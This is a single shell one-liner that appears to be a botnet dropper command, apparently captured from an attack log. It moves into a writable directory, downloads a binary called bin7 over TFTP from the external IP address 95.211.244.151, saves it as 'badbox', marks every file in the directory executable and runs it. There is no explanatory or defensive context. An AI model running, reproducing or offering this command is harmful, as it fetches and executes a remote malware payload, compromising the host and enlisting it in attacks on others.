cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bin7 -g 95.211.244.151;cat bin7 >badbox;chmod +x *;./badbox
